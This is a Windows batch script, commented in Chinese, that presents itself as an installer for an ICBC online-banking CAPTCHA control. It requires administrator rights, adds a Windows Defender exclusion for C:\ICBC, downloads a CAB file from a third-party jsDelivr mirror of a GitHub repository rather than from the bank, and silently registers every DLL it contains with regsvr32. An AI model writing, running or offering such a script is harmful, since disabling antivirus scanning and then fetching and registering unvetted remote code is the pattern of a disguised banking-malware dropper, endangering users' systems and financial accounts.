@echo off

:: 设置控制台为 UTF-8 编码，支持中文显示（若系统不支持可注释掉）
chcp 65001 >nul 2>&1
title 安装工行网银验证码控件

setlocal enabledelayedexpansion

:-------------------------------------
: 检查是否以管理员身份运行
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo 错误：请以管理员身份运行此脚本！
    pause
    exit /b 1
)

: 配置参数
set "cabUrl=https://cdn.jsdmirror.com/gh/huibsoft/static/AxSafeControls.cab"
set "targetDir=C:\ICBC"
set "cabFileName=AxSafeControls.cab"
set "cabPath=%targetDir%\%cabFileName%"

echo.
echo 安装工行网银验证码控件
echo.

: 1. 准备目标目录
if exist "%targetDir%" (
    rmdir /s /q "%targetDir%"
)
mkdir "%targetDir%" >nul 2>&1

: 2. 添加 Defender 排除项（调用 PowerShell）
powershell -command "Add-MpPreference -ExclusionPath '%targetDir%' -ErrorAction SilentlyContinue"

: 3. 下载 CAB 文件
echo.
echo.
echo.
echo [%time:~0,8%] 正在下载控件...

powershell -command "try { Invoke-WebRequest -Uri '%cabUrl%' -OutFile '%cabPath%' -UseBasicParsing -ErrorAction Stop } catch { write-host '下载失败: ' $_; exit 1 }"

if %errorlevel% neq 0 (
    echo 下载失败，请检查网络和 URL。
    pause
    exit /b 1
)

: 4. 解压 CAB 文件
echo [%time:~0,8%] 正在解压文件...
expand "%cabPath%" -F:* "%targetDir%" >nul 2>&1
if %errorlevel% neq 0 (
    echo 解压失败。
    pause
    exit /b 1
)

: 5. 查找所有需要注册的 DLL 文件
set count=0
:: 确定 regsvr32 路径
set "regsvr32=%windir%\system32\regsvr32.exe"
if exist "%windir%\SysWOW64\regsvr32.exe" (
    set "regsvr32=%windir%\SysWOW64\regsvr32.exe"
)

echo [%time:~0,8%] 找到以下待注册文件：
for /r "%targetDir%" %%i in (*.dll) do (
    echo     - %%~nxi
    set /a count+=1
)
if %count% equ 0 (
    echo 在解压文件中未找到任何需要注册的 DLL 文件。
    pause
    exit /b 1
)

: 6. 循环注册每个 DLL
echo [%time:~0,8%] 开始注册控件...
for /r "%targetDir%" %%i in (*.dll) do (
    set "filename=%%~nxi"
    <nul set /p =正在注册: !filename! ... 
    :: 直接执行注册命令（用双引号包围 regsvr32 路径和 DLL 路径）
    "%regsvr32%" /s "%%i"
    if !errorlevel! equ 0 (
        echo 成功
    ) else (
        echo 失败 (错误码: !errorlevel!)
    )
)

: 7. 清理 CAB 文件
if exist "%cabPath%" (
    del /f /q "%cabPath%" >nul 2>&1
)
echo [%time:~0,8%] 控件安装完成 =^> %targetDir%

: 结束，等待按键
echo.
echo 请按任意键退出...
pause >nul
exit /b 0